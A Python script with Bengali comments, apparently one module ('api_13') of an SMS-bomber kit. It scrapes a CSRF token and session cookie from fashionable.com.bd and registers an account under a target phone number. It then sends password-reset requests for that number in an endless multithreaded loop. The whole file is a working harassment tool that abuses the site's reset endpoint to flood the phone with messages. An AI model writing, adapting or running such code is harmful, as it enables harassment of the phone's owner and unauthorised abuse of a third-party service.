import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Total requests counter
total_requests = 0

# Predefined details
name = "Rahat"
# The 'phone' variable should be defined below, after input from the user
password = "12345678"
address = "Chittagong bd bd bd"  # Correctly using the predefined address variable

def send_registration_request(name, phone, password, address):
    """
    Fashionable API তে রেজিস্ট্রেশন রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    url = "https://fashionable.com.bd/login"
    response = requests.get(url)

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']
    
    cookies = response.cookies.get_dict()
    fashionable_session = cookies.get('fashionable_session', 'Not Found')

    if not csrf_token or not fashionable_session:
        print("Failed to retrieve CSRF token or session cookie.")
        return

    # Registration request
    registration_url = "https://fashionable.com.bd/registration"
    headers = {
        "Host": "fashionable.com.bd",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"fashionable_session={fashionable_session}"
    }

    data = {
        "_token": csrf_token,
        "name": name,
        "phone": phone,
        "password": password,
        "address": address  # Using the predefined address variable here
    }

    try:
        response = requests.post(registration_url, headers=headers, data=data)
        total_requests += 1
        soup = BeautifulSoup(response.text, 'html.parser')
        error_message = soup.find('label', class_='helper-text text-danger')

        if error_message:
            print(f"[api_13] [{total_requests}] Error: {error_message.text.strip()}")
        else:
            print(f"[api_13] [{total_requests}] Registration successful!")
    except Exception as e:
        print(f"[api_13] Error: {e}")

def send_password_reset_request(phone):
    """
    Fashionable API তে পাসওয়ার্ড রিসেট রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    url = "https://fashionable.com.bd/login"
    response = requests.get(url)

    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']
    
    cookies = response.cookies.get_dict()
    fashionable_session = cookies.get('fashionable_session', 'Not Found')

    if not csrf_token or not fashionable_session:
        print("Failed to retrieve CSRF token or session cookie.")
        return

    # Password reset request
    password_reset_url = "https://fashionable.com.bd/forget-password/post"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"fashionable_session={fashionable_session}"
    }

    data = {
        "_token": csrf_token,
        "phone": phone
    }

    try:
        response = requests.post(password_reset_url, headers=headers, data=data)
        total_requests += 1
        print(f"[api_13] [{total_requests}] Password Reset Request Sent for {phone}. Response: {response.status_code}")
    except Exception as e:
        print(f"[api_13] Error: {e}")

def main(phone, threads):
    """
    মাল্টিথ্রেডিং ব্যবহার করে Fashionable API তে রিকোয়েস্ট পাঠানো।
    """
    global total_requests

    # মোবাইল নম্বর যাচাই করা
    if len(phone) != 11 or not phone.isdigit():
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    # Send registration request once
    send_registration_request(name, phone, password, address)

    # মাল্টিথ্রেডিং দিয়ে পাসওয়ার্ড রিসেট রিকোয়েস্ট পাঠানো
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [
                executor.submit(send_password_reset_request, phone)
            ]
            for future in futures:
                future.result()

if __name__ == "__main__":
    phone = input("Enter an 11-digit phone number: ")  # Only phone number is taken as input
    threads = int(input("Threads (1-50): "))  # Threads for concurrent requests
    main(phone, threads)